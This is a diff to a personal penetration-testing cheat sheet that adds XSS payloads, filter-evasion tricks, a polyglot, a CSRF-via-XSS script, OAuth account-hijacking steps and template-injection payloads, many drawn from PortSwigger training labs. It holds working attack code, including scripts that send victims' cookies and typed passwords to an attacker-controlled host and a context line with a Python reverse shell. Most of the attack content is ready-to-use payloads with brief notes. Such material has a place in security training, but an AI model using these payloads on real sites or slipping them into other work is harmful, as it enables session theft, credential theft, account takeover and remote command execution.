@@ -46,24 +46,107 @@ TABLE OF CONTENTS
                 - Occurs when user inputs (like URL parameters) are reflected back onto the web page. Adversaries can inject script tags to run arbitrary code. 
                 http://10.102.11.197/purchase?id=<script>alert("xss")</script>
                 2.1.1
-                        Tip: check if URL parameter is reflected in the webpage. I.e. from Blake Jarvis, "web.k" reflected into "class" attribute. double-quotes not escaped, 
+                        - Tip: check if URL parameter is reflected in the webpage. I.e. from Blake Jarvis, "web.k" reflected into "class" attribute. double-quotes not escaped, 
                         leading to xss. 
                         es-pe/web.k"onpageshow=alert(1)%20y="
+                2.1.2
+                        - Tip: If a certain payload doesn't work, try multiple. PortSwigger lab rejected <script> tags but worked with <img> tag. [23]
         2.2 STORED
                 - Occurs when user inputs are STORED (like blog comments) and reflected back onto the web page. Anyone visiting the blog will be victim.
         2.3 DOM-BASED
                 - The technique to avoid sending payload to the server hinges on the fact that URI fragments (i.e. part in URI after #) is not sent to server
                 - somesite.com/page.html#default=<XSSinjection>
+                2.3.1 
+                        - If input is reflected in href tag, try the following payload to achieve code execution [24]
+                        javascript:alert(1)
+                        https://0a76008f032e38dec037a4a3007c0075.web-security-academy.net/feedback?returnPath=javascript:alert(1)
+                2.3.2
+                        - This example includes XSS payload included after # in the URL. jQuery code on the webpage executes it.  
+                        https://0a6c00cb04681a13c0f2cfe7000800d9.web-security-academy.net/#<img%20src=x%20onerror=alert(1)>
+                2.3.3 
+                        - Check if user input is used in eval() anywhere.
+
         2.4 EXFILTRATING A VICTIM'S COOKIES
                 2.4.1 WEBSERVER REDIRECTION
                         $ python -m http.server 80
                         <script>window.location.replace("http://10.102.4.49/"+document.cookie)</script>         //NOT STEALTHY!!!
-        2.5 FILTER EVASION
+                2.4.2 BURPSUITE COLLABORATOR CLIENT
+                        - Create Burp Collaborator link
+                        2.4.2.1 SIMPLE
+                                <script>window.location.replace("http://<BURP-COLLABORATOR-SUBDOMAIN>/"+document.cookie)</script>
+                        2.4.2.2 ELEGANT
+                                <script>fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
+        2.5 EXFILTRATING PASSWORD
+                2.5.1 BURPSUITE COLLABORATOR CLIENT
+                        2.5.1.1
+                                <input name=username id=username>
+                                <input type=password name=password onchange="if(this.value.length)fetch('https://<BURP-COLLABORATOR-SUBDOMAIN>',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
+        2.6 FILTER EVASION
                 - Full list at https://kalilinuxtutorials.com/xss-payload-list/
-                2.5.1
+                2.6.1
                         <BODY ONLOAD=alert('XSS')>
-                2.5.2
-                        onpageshow=alert(1)
+                2.6.2 IF CARETS ENCODED [26]
+                        2.6.2.1
+                                "onpageshow="alert(1)
+                        2.6.2.2
+                                "onmouseover="alert(1)
+                2.6.3 JSON BREAKOUT [28]
+                        - This example only works if input is within eval()
+                        - If http response is JSON format, break out by:
+                                inserting \" to break out
+                                add in arithmetic operator like "-" or "+"
+                                run execution code, i.e. alert(1)
+                                add in // double backslash to comment out rest of JSON
+                        \"-alert(1)}//
+                        https://0a2700a504f96ce0c1f96a4700e900dc.web-security-academy.net/?search=\"-alert(1)//
+                2.6.4 JAVASCRIPT REPLACE FUNCTION
+                        - JavaScript replace() function only removes first instance of offending characters. 
+                        <><img src=x onerror=alert(1)>
+                2.6.5 EXHAUSTIVE XSS CAPABILITY CHECK
+                        2.6.5.1 [30] 
+                                - Use when WAF blocks many/most HTML tags and attributes. This technique will check if any vulnerable tags are available.
+                                - Burp Intruder
+                                - Send request with <§§>
+                                - Use XSS Cheat Sheet [31] as payload. First, check allowed tags.
+                                - Then, check allowed attributes. 
+                                - For example, <body%20§§=1>
+        2.7 XSS POLYGLOT
+                        2.7.1 [25]
+                                JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76->\
+        2.8 CSRF THROUGH XSS
+                2.8.1 [29]
+                        <script>
+                        var req = new XMLHttpRequest();
+                        req.onload = handleResponse;
+                        req.open('get','/my-account',true);
+                        req.send();
+                        function handleResponse() {
+                                var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+                                var changeReq = new XMLHttpRequest();
+                                changeReq.open('post', '/my-account/change-email', true);
+                                changeReq.send('csrf='+token+'&email=test@test.com')
+                        };
+                        </script>
+                        - req.open points to /my-account since this is the webpage where the query CSRF is sent to client.
+                        - var token is set this way since the csrf token is labeled as "csrf" in HTML
+                        - changeReq request imitates normal POST request, including URL and HTTP body. 
+        2.9 XSS VIA CUSTOM TAG
+                2.9.1 [32]
+                        2.9.1.1 EXAMPLE PAYLOAD
+                                <xss id=x2467 onfocus=alert(document.cookie) tabindex=1>
+                                https://0a3b008003696505c0a44a0300ca00f2.web-security-academy.net/?search=%3Cxss+id%3D%22x2467%22+onfocus%3Dalert(1)+tabindex%3D1%3E#x2467
+                        2.9.1.2 DESCRIPTION
+                                - Custom tag is <xss>
+                                - Set custom id of "x2467". This will allow us to focus on the element later with #
+                                - Set payload within onfocus attribute
+                                - Set tabindex attribute in order for element to be focusable [33]
+                                - In URL, focus on the new element with #<id>
+        2.10 XSS VIA CANONICAL LINK
+                2.10.1 [34]
+                        2.10.1.1 EXAMPLE PAYLOAD
+                                'accesskey='x'onclick='alert(1)
+                                https://your-lab-id.web-security-academy.net/?'accesskey='x'onclick='alert(1)
+                                Execute via CTRL+ALT+X
 3. COMMAND LINE KUNG FU
         3.1 COMMAND HISTORY
                 3.1.1 Commands entered in terminal are tracked using HISTFILE environment variable and written to ~/.bashrc when user logs off.
@@ -127,6 +210,48 @@ TABLE OF CONTENTS
         8.4 PYTHON
                 8.4.1
                         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+12. OAUTH
+        12.1 OVERVIEW
+                12.1.1 ACTORS [34]
+                        - Client application: The website or web application that wants to access the user's data.
+                        - Resource owner: The user whose data the client application wants to access.
+                        - OAuth service provider: The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.
+        12.2 LACK OF STATE PARAMETER
+                12.2.1 DESCRIPTION [34]
+                        - The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. 
+                        - This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application.
+                12.2.2 CSRF ATTACK
+                        - If application does not have a state parameter
+                        - Proceed with application flow until code is provided
+                                GET /oauth-login?code=oq3qEnE0sLDSvC0pU5sJH_F6Fl_D2-0LarqzpRvQMuh
+                        - Drop this request, so the code stays valid. Induce victim to click on link.
+                        - Victim's client application account will now be tied to attacker's OAuth service provider.
+        12.3 REDIRECT_URI TAMPERING
+                12.3.1 DESCRIPTION [34]
+                        - Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request.
+                        - An attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri
+                12.3.2 ACCOUNT HIJACKING
+                        - Create a malicious page with iframe
+                        - src = https://<OAUTH_SERVER>/auth?client_id=<CLIENT_ID>&redirect_uri=https://<MALICIOUSPAGE/EXPLOIT>&response_type=code&scope=openid%20profile%20email
+                        - Once victim clicks link, attacker's malicious /exploit endpoint will receive a request will receive generated code on behalf of victim
+                        - Use this code to complete attacker OAuth signin
+        12.4 REDIRECT_URI TAMPERING WITH DIRECTORY TRAVERSAL AND OPEN REDIRECT [35]
+                12.4.1 DESCRIPTION
+                        - Application does not allow arbitrary redirect_uri in OAuth flow
+                        - However, application suffers from directory traversal in redirect_uri
+                                https://0a7600fa030265c2c09b6fb700bf0039.web-security-academy.net/oauth-callback/../ succeeds
+                        - Application also suffers from Open Redirect elsewhere in the application
+                                GET /post/next?path=/post?postId=7
+                        - Combine these vulnerabilities for OAuth Hijack
+                                https://oauth-0a7100ff03bd6506c0656fae027f00c3.web-security-academy.net/auth?client_id=isgfn26et0sfnowt1gyyv&redirect_uri=https://0a7600fa030265c2c09b6fb700bf0039.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0abe001b030265f9c0e16ff501a00034.web-security-academy.net/exploit&response_type=token&nonce=-1025754742&scope=openid%20profile%20email
+                        - contents of /exploit
+                                <script>
+                                if (!document.location.hash) {
+                                        window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+                                } else {
+                                        window.location = '/?'+document.location.hash.substr(1)
+                                }
+                                </script>
 13. BYPASSING HTTP CLIENT-SIDE CONTROLS
         13.1 HIDDEN FORM FIELDS
         13.2 HTTP COOKIES
@@ -322,22 +447,34 @@ TABLE OF CONTENTS
 22. Server-side Template Injection (SSTI)
         22.1 DESCRIPTION
                 - Attacker uses native template syntax to inject a payload into a web template, which is then executed server-side and displayed to end user.
-                - Unlike most reflected or stored XSS vulnerabilities, a template injection vulnerability can result in code being run on the server, rather than the user’s client. 
+                - Unlike most reflected or stored XSS vulnerabilities, a template injection vulnerability can result in code being run on the server, rather than the user's client.
+                - AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). [27]
+                        - When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. 
+                        - This technique is useful when angle brackets are being encoded. 
         22.2 IDENTIFYING
-                22.2.1 JINJA
+                22.2.1 ANGULAR 
+                        - Observe if input is enclosed in an ng-app directive. Perhaps in <body> tag. [27]
+        22.3 CONFIRMING EXPLOITABILITY
+                22.3.1 JINJA
                         {{ 3 * '3' }} will resolve to 333. Python. 
-                22.2.2 TWIG
+                22.3.2 TWIG
                         {{ 3 * '3' }} will resolve to 9. PHP.
-        22.3 SEARCHING FOR EXPLOITABLE CLASSES
-                22.3.1
+                22.3.3 JAVASCRIPT
+                        ${ 7 * 7 } will resolve to 49.
+        22.4 SEARCHING FOR EXPLOITABLE CLASSES
+                22.4.1
                         {{ ''.__class__.__mro__[1].__subclasses__()[0:10] }}
                         Returns first 10 classes. Iterate and identify exploitable classes. 
-        22.4 EXPLOITABLE CLASSES
-                22.4.1 
+        22.5 EXPLOITABLE CLASSES
+                22.5.1 
                         os.system
-                22.4.2 [21]
+                22.5.2 [21]
                         subprocess.Popen
                         {{ ''.__class__.__mro__[1].__subclasses__()[<INSERT INDEX HERE>]('ls',shell=True,stdout=-1).communicate() }}
+        22.6 EXAMPLE PAYLOAD
+                22.6.1 [27]
+                        {{$on.constructor('alert(1)')()}}
+                        https://0aae00d903ba322ec0211e0e00c700e3.web-security-academy.net/?search={{$on.constructor(%27alert(1)%27)()}}
 23. SMB
         23.1 ENUMERATION
                 23.1.1 NMAP
@@ -432,11 +569,16 @@ References
 [20] https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
 [21] https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 [22] https://tldp.org/HOWTO/SMB-HOWTO-8.html
-
-
-
-
-
-
-
-
+[23] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+[24] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
+[25] https://brutelogic.com.br/blog/building-xss-polyglots/
+[26] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
+[27] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
+[28] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+[29] https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+[30] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
+[31] https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+[32] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
+[33] https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex
+[34] https://portswigger.net/web-security/oauth
+[35] https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
